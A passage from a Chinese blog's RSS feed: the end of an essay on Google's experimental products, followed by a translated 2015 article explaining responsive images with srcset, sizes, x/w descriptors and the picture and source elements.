的决策者们并不懂市场需求。</p><p >事实上，Google 无需理会市场需求，它只是在做自己喜欢的事情而已。这些“然并卵”的产品，有许多真的是设计师灵光一闪而成型的，都是些“未来型”的科技产品，本来就没打算在这个时代赢得多少市场。可以说，Google 在尝试给未来的科技发展提供多种可能的方向。即便是失败了，也无妨，反正这只是一个异想天开。</p><p >这种超常的自信，源于 Google 雄厚的资本积累。Google 几乎垄断了全世界的搜索引擎市场，每季度仅靠投放广告赚的钱便可以维持运转。而搜索引擎并不需要很短的迭代周期，因此 Google 有充足的时间和金钱来做自己喜欢做的事情。</p><h2 id="后记">后记</h2><blockquote><p  class="noindent"> 我有一个很好的 idea，产品做出来肯定会震惊世界的——就只差一个程序员了。<cite> ——一个在业界广为流传的笑话 </cite></p></blockquote><p >能不能震惊世界，并不是由你说了算。你想做的，并不一定是用户想要的。但有一点：<strong>得用户者得天下</strong>。</p><p >==<em>谨以此文，警示将来的自己以及众多踌躇满志的创业者</em>==</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/hobby-or-needs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>【译】响应式图片的现状</title>
      <link>https://i.hsfzxjy.site/the-state-of-responsive-images-in-2015/</link>
      <guid>https://i.hsfzxjy.site/the-state-of-responsive-images-in-2015/</guid>
      <pubDate>Fri, 18 Sep 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;par&quot;&gt; 原文链接：&lt;a href=&quot;http://www.webdesignerdepot.com/2015/08/the-state-of-responsive-images/&quot;&gt;戳这里&lt;/a&gt;&lt;/p&gt;
&lt;/blockquot</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="par"> 原文链接：<a href="http://www.webdesignerdepot.com/2015/08/the-state-of-responsive-images/">戳这里</a></p></blockquote><!-- ![](http://netdna.webdesignerdepot.com/uploads/2015/08/featured_images1.jpg) --><p >Web 是一种可视化的媒体。绚丽的视觉效果，很大程度上离不开图片文件所作出的贡献。虽然（Whilst）其中的许多效果都可以用 CSS 和 内联 SVG 来实现，互联网上的许多站点仍需要图片文件。</p><p >从去年的统计来看，每个站点中，图片平均占了一半的页面体积，并且随着时间的推移，图片体积有持续增加的趋势；就 2014 年而言，图片的大小便增长了 **21%**。</p><p >与此同时，互联网终端的种类、数量也在增长。从 72 ppi（市场份额正在下降）到 600 ppi，不同设备的分辨率（resolution）有着天壤之别。</p><p >创建能在任何设备中都有着高质量的图片，其实再容易不过了——用 1000 ppi 的质量保存图片，然后就可以不用再理他了（译者注：原文是 call it a day）。生成的图片，即使是在分辨率最高的设备上查看也是十分清晰的（crisp）。但是，在图片质量提升的同时，图片文件的大小也会相应地增加。要知道，<strong>页面加载时间</strong>可是影响用户体验的<strong>首要因素</strong>——因此，保证站点能够及时地呈现在用户面前是我们义不容辞（incrumbent）的责任。高质量的图片，即使是在宽带环境下加载也要耗费几十秒，更不用说（let alone）是移动端的设备了——简直就是无法使用。</p><p >响应式图片的目的，不是要为设备提供尽可能高质量的图片（这一点，我们很容易做到），而是要为设备提供它所能支持的最高质量的图片，仅此而已（nothing more）。</p><p >从这篇指南中，你将了解到响应式图片的工作原理（what works），响应式图片仍然存在的问题和陷阱（pitfall），以及如何将响应式图片运用到网站中。</p><h2 id="我能感受到这欲望，对速度的渴求">我能感受到这欲望，对速度的渴求</h2><p >为什么速度这么重要？难道还有人在用 3G 网络吗（译者注：歪果仁科技发达，早已看不起 3G 网络）？如果你的目标客户都住在曼哈顿市中心，为什么还要为莱索托的乡巴佬担心呢（译者注：南非山区）？事实上，“每个人都能用上超快的宽带，用上由那些利欲熏心的公司提供的宽带”——听起来就像个神话。</p><p >每个人每天都要耗费至少两个小时在恶劣的（inferior）网络环境中。就我而言，在挤公交上下班时（commuting），我常常会上网以打发无聊的时光——每当这时，稳定的 3G 网络听起来都像是遥不可及的美梦。</p><p >今年四月的时候，<a href="http://googlewebmastercentral.blogspot.co.uk/2015/04/rolling-out-mobile-friendly-update.html">Google 声称</a>“‘移动设备友好性’将会成为移动站点的排名因素“。甚至，在此之前，<a href="http://googlewebmastercentral.blogspot.co.uk/2011/03/introducing-page-speed-online-with.html">加载速度也是一个重要的排名因素</a>——无论是显式地体现在 Google 的统计中，抑或是隐式地成为影响网站跳出率（bounce rate）的一个重要因素。</p><p >对于两个相近的站点，1Kb 的冗余数据，都可能将你的 Google 排名从第三降到第四、第五，甚至是第十、第十一——换言之，从第一页降到了第二页——这会给你的收入（revenue）带来不小的冲击。</p><h2 id="你真的需要这图片吗？">你真的需要这图片吗？</h2><p >图片优化的最高境界便是：没有图片。你的站点上有五张图片，去掉一张，你便节省了 20%——或许更重要地，你节省了一次 HTTP 请求。如果你将五张图片都去掉了，那你就节省了 100%，以及所有的 HTTP 请求。因此，何乐而不为呢？</p><p >然而，我们并不会这么做——毕竟在短期内，图片比文字更有感染力。它们能和用户建立一种”感情通道“，从而使用户被站点的内容所吸引。</p><p >要知道，<a href="http://www.nngroup.com/articles/how-little-do-users-read/">用户从来不读网页</a>——只有极少数人会深入阅读站点上的内容。图片能让我们在很短的时间（a fraction of time）内了解一个品牌，深深地记住它（reinforce）——这是文字做不到的。</p><p >也许，图片的体积会很大，加载起来显得很笨重。然而一旦被浏览器渲染出来，和文字相比，它们能够更有力地抓住用户的眼球，更高效地传达品牌信息。</p><p >而响应式图片，就是为了更好地把握住这来之不易的”感情通道“，以防不耐烦的用户点击点击了”后退“按钮。</p><h2 id="那么，svg-又怎么样呢？">那么，SVG 又怎么样呢？</h2><p >SVG（可缩放矢量图像）是 Web 发展史上的一大创举。它引领着潮流（ahead of the curve），至今大多数设计师依旧没有意识到其真正的潜力。</p><p >SVG ——正如它的名字所描述——是基于矢量的。这意味着 SVG 图像是由点、角和直线构成的。SVG 同时也是——正如它的名字所描述——是可缩放的，这意味着在 5k iMac 和 Android 智能手机上，它会表现得同样出色——没有质量的损失，也没有体积的差别。</p><p >如果你需要一张平面插图（flat illustration），一个图标，一个 logo 以及其他所有能够以 SVG 的形式显示出来的东西，SVG 是不二之选（the way to go）。</p><p >Web 上大多数图片都是位图。一般来说，位图的工作原理就是将每个像素点依次描述出来，包括它们的颜色（RGB 的形式，即 红、绿、蓝值），以及透明度（在某些场景下）。如果你有一张尺寸为 100px × 100px 的图片，那么它将有 10000 个像素点。如果每个像素点都用 4 个值来描述，那么这张图将等同于 40000 bits 的数据。听起来很多，不是吗？然而有时，它们的体积会比矢量图还要小。</p><p >考虑 1px × 1px 的图片，若使用位图，则需要 4 bits 来记录（红、绿、蓝，以及透明度）。现在考虑用矢量的形式来记录相同尺寸的图片：除了 RGBA 颜色值之外，还需要矩形的左上角坐标、长度和宽度这几个量。</p><p >这都是些极端的（crude）情况，但它们是准确的。通常，如果一幅图片的矢量版本——假使有的话——比同样的（equivalent）位图占用的体积还要多，那么位图是唯一合理的选择。</p><h2 id="（错误地）使用-javascript">（错误地）使用 Javascript</h2><p >正如生活中的许多问题（如果你的生活是在网络上的话），响应式图片也可以用 Javascript 来解决。事实上，在过去的许多年中，Javascript 是解决这个问题的唯一途径。通过对 User Agent 进行测试，Javascript 可以知道当前的浏览器类型，然后将指向合适的图片地址的 <code>image</code> 标签输出到页面上。</p><p >有些 Web 设计师反对这么做，理由是：<a href="https://gds.blog.gov.uk/2013/10/21/how-many-people-are-missing-out-on-javascript-enhancement/">有些人会关闭 Javascript 功能</a>。然而，这种情况已经非常少见了，尤其是在移动设备中。尽管如此，这种方法仍存在着一些问题——比如，这种图片不会被搜索引擎机器人解析出来，而且只有当脚本执行后图片才会被加载出来。</p><p >事实上，使用 Javascript 最大问题是：这是一种有悖于 Javascript 主要目的的使用方式。HTML 管理数据，CSS 处理表现形式，而 Javascript 负责功能实现。当我们违背了这些既定规则时，我们就会遇到各种各样的问题，遇到需要”奇技淫巧“（hack）来解决的问题。图片的本质是数据，因此应该交由 HTML 来处理。</p><h2 id="浏览器的问题">浏览器的问题</h2><p >从 RWD（响应式网页设计，Responsive Web Design）提出至今，图片都是最大的绊脚石（stumbling block）。然而现在，我们要开始寻找方法来解决这各种各样的问题了。能够被称为”最佳实践“的，都是那些久经沙场的（battle-hardened）、有足够成功案例的技术。专业的（dedicated）开发者已经牺牲了自己的时间去去游说（lobby）W3C，以求获得官方的解决方案。而现在，响应式图片第一次成为了可能。</p><p >响应式图片的关键，在于它充分地意识到了 Web 的失败之处。为保证响应式图片不会使浏览器崩溃，设计者们早已考虑得十分周到——即使对于不支持响应式图片的浏览器，代码也不会报错，而是向用户展示一张默认的、非响应式的图片。</p><p >在这篇文章中，我们将见到两个官方的响应式图片标签：<code>srcset</code> 以及 <code>picture</code>。</p><p >截至目前，Edge、Safari 和 iOS Safari 只支持 <code>srcset</code> 的一部分特性。Firefox、Chrome、Opera、Android 内置浏览器以及下一个版本的 Safari 和 iOS Safari 都将会完整地支持它。（我们会在下文讨论它们的区别）</p><p >而 <code>picture</code> 元素，已经被 Firefox、Chrome、Opera 以及 Android 内置浏览器完美支持。Edge、Safari 和 iOS Safari 则完全不支持，并且暂时也没有实现它们的打算。</p><p >由于不同厂商解析 W3C 特性的方法不同，即使是在兼容它们的浏览器中，也有一些不一致的地方。例如，当你使用 viewport 的大小来区分不同的设备时，有些浏览器会在 viewport 比小图片大 1px 时便将小图切换为大图，而另外一些则在 viewport 完全符合大图显示条件时才会这么做。</p><p >总之，浏览器可以分为两大阵营：想要图片质量尽可能高的 以及 想要图片体积尽可能小的。浏览器厂商都在各自推崇（duking）自己的主张，直到某一方的实现被大众所认可——个人而言我喜欢后者，因为它认为性能对用户体验而言更加关键。</p><p >至于现在，Web 设计人员的最佳选择就是：坚持 W3C 标准，而不要对浏览器作额外的猜测。毕竟，浏览器的默认体验（高质量 或是 高性能）是由用户选择的默认浏览器决定的——因此，如果用户意识到这其中的区别，那么用户的偏好就最有可能成为浏览器的偏好（译者注：这里怪怪的）。</p><h2 id="响应式图片最佳实践（2015）">响应式图片最佳实践（2015）</h2><p >纵观 Web 的历史，我们曾经用一个标签来表示图片：<code>img</code> 标签。在 HTML5 中，<code>img</code> 的角色经历了（undergone）一些微妙（subtle）的变化——它被设计成响应式图片的开关，即其不再代表一张图片，而只是响应式图片的占位符。</p><p >这其中的区别十分重要。曾经，<code>img</code> 标签只能持有一副图片的数据（位图 或 矢量图）——而现在，它能持有多幅图的数据。</p><p ><code>img</code>标签看起来是这样的（概括（recap）给非开发者）：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span></span><br></pre></div></div><p ><code>img</code> 标签的响应式版本看起来是这样的：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span></span><br></pre></div></div><p >仅仅（Barely）只有一些区别而已。仔细看代码，你会注意到一件重要的事情：<strong>代码是向后兼容的</strong>。如果一个浏览器不能理解 <code>srcset</code> 属性，它会简单地忽略它，并按照 1993 年的原始标准进行渲染。</p><p >这意味着：我们能通过标记来使用响应式图片，而不需要对相关特性进行检测。</p><p >在新的响应式 <code>img</code> 标签中，原则上 <code>src</code> 属性只是为不支持 <code>srcset</code> 的浏览器指定了默认的图片地址，而 <code>srcset</code> 属性则包含了用于适配各种分辨率的图片信息。</p><p >在渲染 <code>img</code> 标签是时，浏览器会自己决定出最适合的图片文件。</p><h3 id="使用-srcset">使用 srcset</h3><p >既然我们已经知道 <code>srcset</code> 在不兼容的浏览器中会静默失败，我们便可以子有底增加图片了：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;image-b.jpg&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image-a.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >在这个例子中，任何支持 <code>srcset</code> 的浏览器将会显示 <code>image-b.jpg</code>，而任何不支持的浏览器则会显示 <code>image-a.jpg</code>。</p><p >重要的是，你要知道浏览器只会下载它想要显示的图片，而并不会将所有图片都加载出来后再进行选择。</p><p >遗憾的是，我们并没有任何进步——除非我们是在展示 <code>srcset</code> 属性的使用，仅靠 <code>srcset</code> 的支持与否来加载图片并没有什么实际的应用。</p><p >解决方法就是：为浏览器提供更多的信息，让其知道自己该选择那一张图片。为了做到这一点，我们需要提供和图片的 像素密度（pixel density）以及 可用空间（available space）相关的信息。</p><h3 id="使用-x-描述符">使用 x 描述符</h3><p >x 描述符能够让浏览器知道图片的像素密度。</p><p >举个例子，如果你想要提供一张两倍像素于标准图片的 视网膜级的（retina-grade）的图片，你需要在 <code>srcset</code> 中做出说明：在文件名后加上 <code>2x</code>。</p><p >这是我们的图片：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >为了给浏览器增添一个视网膜选项，我们将作出如下修改：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 2x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >在这个案例中，有三个可能的结果：</p><ol><li>如果浏览器不支持 <code>srcset</code>，则 <code>src</code> 所定义的图片将会被使用。</li><li>如果浏览器支持 <code>srcset</code> ，并且屏幕能够胜任两倍的分辨率，则 <code>srcset</code> 所定义的图片将会被采用</li><li>如果浏览器支持 <code>srcset</code>，但是没有足够高的分辨率，<code>src</code> 所定义的图片将会被采用（在 <code>srcset</code> 没有定义 <code>1x</code> 图片的情况下，<code>src</code> 属性会被视为这种情况下的选项）</li></ol><p >浏览器支持是良好的，并且在飞快地改进中。只用一个属性，我们就解决了响应式图片的难题（conundrum），真棒！</p><p >最后，关于 x 描述符，值得注意的是：图片的选择是基于像素密度的。故如果一个用户将浏览器缩放至 200%（等效于将图片大小减半，将像素密度加倍），2x 图片将会被加载。这会对 无障碍访问设备（accessibility）造成一些不利（detrimental）的影响——我们当然不希望在视力受损者访问网站时加载速度下降，而仅仅是因为他们缩放了网页。</p><h3 id="使用-w-描述符">使用 w 描述符</h3><p >w 描述符比 x 描述符稍微先进一些。w 描述符的工作原理是：对于一个特定的图片选项，它会告诉浏览器 x 轴上的实际像素有多少（即宽度）。</p><p >截止写作时，Edge，Safari 以及 iOS Safari 尚不支持 w 描述符，这在某些程度上削弱了它的实用性。</p><p >让我们回到原来的图片：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >假设在本地时，这张图片的宽度是 1600 像素，现在我们想要新增一张视网膜级的图片。正如 x 描述符，我们将在 <code>srcset</code> 中定义宽为一张 3200 像素的图片：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 3200w&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >w 描述符最大的毛病（gotcha）就是：尽管在使用 x 描述符时， <code>src</code> 属性被视为默认选项，在支持 <code>srcset</code> 的浏览器上使用 w 描述符时它却会被忽略。在使用 w 描述符时，我们只能显示地定义默认图片：加上第二个 <code>srcset</code> 图片选项，用逗号分隔：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 3200w, image.jpg 1600w&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >导致有代码洁癖的我们要去使用……</p><h3 id="使用多幅图片">使用多幅图片</h3><p >能够在 HTML 代码中为浏览器提供高分辨率图片选项，确实很酷——然而，就像你所猜测的那样，当我们指定多幅图片时，事情会变得更酷。</p><p >响应式图片的目的，就是为了给不同的设备提供尽可能高质量的图片，而不要存在任何冗余。简单地提供一张高质量的图片还不够，我们需要提供更多的选择——比如 1x、1.5x、2x、2.5x 和 3x 的。</p><p >再回过头来，这是我们的原始定义：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >接下来，我们为浏览器提供了一个视网膜级的选项：</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 2x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >而在这一次，我们会提供更多的额外选项，我们用逗号分隔它们：</p><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;huge-image.jpg 3x, retina-image 2x, moderate-image 1.5x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >由于对于不同的人而言，关键字有着不同的意思，我建议根据 x 描述符来为图片命名，这样更有助于人脑的记忆，同时也更容易确定各个图片的尺寸以及让团队中的成员更加清楚：</p><div class="gk-code hljs" data-gk-id="BLOCK12"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;image_3x.jpg 3x, image_2x.jpg 2x, image_1-5.jpg 1.5x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >要记住：我们并没有告诉浏览器应该选择哪一幅图片，我们只是将可用的选项告诉了它，并允许它自行选择。浏览器只会下载其中的一副图片。</p><p >在使用多幅图片时有一个问题：永远不要为一幅图片定义两种描述符——举个例子：</p><div class="gk-code hljs" data-gk-id="BLOCK13"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;cross-the-streams.jpg 2x, cross-the-streams.jpg 3200w&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p ><a href="https://www.youtube.com/watch?v=jyaLZHiJJnE">这会很不好</a>……</p><h3 id="使用-sizes">使用 sizes</h3><p >除了定义格式，<code>sizes</code> 属性是相当有趣的，因为 <code>sizes</code> 属性的值是相对于 viewport 而言的，而不是图片本身。</p><p >使用 <code>vw</code> （viewport width），我们以相对于浏览器宽度的方式指定了图片区域——记住，<code>img</code> 标签现在只等效于一个占位符，因此我们不是在指定图片的实际尺寸，而是在指定包含图片的占位符的尺寸。</p><p ><code>100v</code> 就是 100% 的 viewport 宽度， <code>50vw</code> 就是 50% 的 viewport 宽度，<code>25vw</code> 就是 25% 的 viewport 宽度……以此类推。</p><p >如果我们想让 <code>img</code> 的宽度达到浏览器宽度的一半，我们可以这样：</p><div class="gk-code hljs" data-gk-id="BLOCK14"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">sizes</span>=<span class="hljs-string">&quot;50vw&quot;</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 2x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >这并不是特别有用，直到我们将它和 media query 结合起来……</p><h3 id="使用-media-query">使用 media query</h3><p >当我们将 <code>sizes</code> 属性和 media query 相结合时，它会变得越来越强大。我们可以用逗号分隔多个 viewport 宽度，并通过 CSS 风格的 media query 告诉浏览器该使用哪一个。</p><p >举个例子，想象我们需要这么一张图片：在大多数的设备上它将占用 80% 的浏览器宽度，但在宽度小于等于  380px 的小尺寸设备（手机）上，我们想让它充满所有的空间（100% 的宽度）。我们应该这么写：</p><div class="gk-code hljs" data-gk-id="BLOCK15"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">sizes</span>=<span class="hljs-string">&quot;(max-width: 380px) 100vw, 80vw&quot;</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 2x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >根据这个逻辑，任何视口宽度小于等于 380px 的浏览器会让图片充满 100% 的视口。其他的浏览器则会导致 media query 返回 <code>false</code>，从而采用另外的值——在这个例子中，即 <code>80vw</code>。</p><p >一般说来（As a general rule），我对在 HTML 使用 media query 表示十分反感。只是因为响应式图片数据是属于 HTML 的（不是 Javascript），而 media query 却是属于 CSS 的（不是 HTML）。但是，如果你需要，这也不失为一个选择。</p><h2 id="响应式图片的最佳实践（2016？）">响应式图片的最佳实践（2016？）</h2><p >我不知道你是怎么想的，但我确实为 <code>srcset</code> 带来的改变感到兴奋。这是一个复杂问题的一个简单的解决方案，并且似乎提供了我们所需的所有东西。</p><p >但是，就像公交车一样，你为了响应式图片的官方解决方案等待了 20 年，而且一上场就有两个。除了 <code>img</code> 标签的 <code>srcset</code> 属性，我们还有 <code>picture</code> 标签。</p><p ><code>picture</code> 标签是另外一种占位符——尽管（albeit）是较为传统的一种。它被设计为 HTML5 中 <code>audio</code> 和 <code>video</code> 标签的模仿者（mimic），因此，它的语法被大多数人所熟识。当你需要更多 <code>srcset</code> 不能提供的功能时，建议你使用 <code>picture</code>。</p><p >遗憾的是，<code>picture</code> 的浏览器支持比 <code>srcset</code> 更差，并且<strong>它不会静默失败</strong>。</p><h3 id="使用-picture">使用 picture</h3><p >这是图片的原始定义：</p><div class="gk-code hljs" data-gk-id="BLOCK16"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><p >这是一副嵌套在 <code>picture</code> 中的图片：</p><div class="gk-code hljs" data-gk-id="BLOCK17"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">picture</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">picture</span>&gt;</span></span><br></pre></div></div><p >在 <code>picture</code> 标签中，我们也可以为 <code>img</code> 标签指定 <code>srcset</code> 属性：</p><div class="gk-code hljs" data-gk-id="BLOCK18"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">picture</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 2x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">picture</span>&gt;</span></span><br></pre></div></div><h3 id="使用-source-标签">使用 source 标签</h3><p >在没有增加 <code>source</code> 标签时，<code>picture</code> 标签是死的：</p><div class="gk-code hljs" data-gk-id="BLOCK19"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">picture</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> /&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">picture</span>&gt;</span></span><br></pre></div></div><p >当选择所要展示的图片时，浏览器会从第一个 <code>source</code> 标签开始遍历，直到找到一个 <code>media</code> 值为 <code>true</code> 的 <code>source</code> 标签为止。该 <code>source</code> 标签的 <code>srcset</code> 属性将会被采用。</p><p >例如，我们可以为图片指定”肖像“（portrait）格式和”风景“格式：</p><div class="gk-code hljs" data-gk-id="BLOCK20"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">picture</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;orientation:landscape&quot;</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;horizontal-image.jpg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;orientation:portrait&quot;</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;vertical-image.jpg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">picture</span>&gt;</span></span><br></pre></div></div><p >甚至，我们可以用 x 描述符 和 w 描述符 来指定多幅图片：</p><div class="gk-code hljs" data-gk-id="BLOCK21"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">picture</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;orientation:landscape&quot;</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-horizontal-image.jpg 2x, horizontal-image.jpg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;orientation:portrait&quot;</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-vertical-image.jpg 2x, vertical-image.jpg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">picture</span>&gt;</span></span><br></pre></div></div><p >在 <code>sizes</code> 属性中使用 media query 时，我会质疑在 HTML 而不是在 CSS 中基于样式来控制图片的合理性。然而，如果你需要，<code>media</code> 属性也不失为一种选择。</p><h3 id="使用-type">使用 type</h3><p ><code>picture</code> 标签真正厉害的地方，在于它能从不同的图片类型中作出选择。</p><p >想象我们现在有一张标准 PNG 图片，但我们想用 <a 